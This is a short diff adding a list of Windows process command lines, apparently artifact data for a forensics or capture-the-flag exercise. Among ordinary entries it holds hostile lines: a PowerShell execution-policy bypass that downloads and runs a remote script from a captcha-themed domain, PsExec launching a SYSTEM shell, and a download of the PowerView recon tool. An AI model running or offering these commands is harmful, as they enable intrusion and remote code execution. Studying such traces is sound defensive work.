@@ -1,0 +1,14 @@
+powershell.exe -Command "Get-ExecutionPolicy"
+cmd.exe
+"C:\Program Files (x86)\Sysinternals\PsExec.exe" -s -d cmd.exe
+C:\Windows\Explorer.EXE
+powershell.exe -Command "Get-WinEvent -LogName System | Where-Object {$_.LevelDisplayName -eq 'Error'} | Select-Object -First 10"
+cmd.exe /c "powershell -Command Get-WinEvent -LogName System | Where-Object {$_.LevelDisplayName -eq 'Error'} | Select-Object -First 10"
+"C:\Program Files\Google\Chrome\Application\chrome.exe" --type=renderer --lang=en-US --enable-auto-reload
+"C:\Program Files\Google\Chrome\Application\chrome.exe"
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://openecsc-captcha.com/api/v2/validate')"
+C:\Windows\Explorer.EXE
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -OutFile 'C:\Users\bagagwauser\Desktop\PowerView.ps1'"
+cmd.exe
+"C:\Program Files\Malwarebytes\Anti-Malware\mbam.exe" /background
+C:\Windows\system32\services.exe
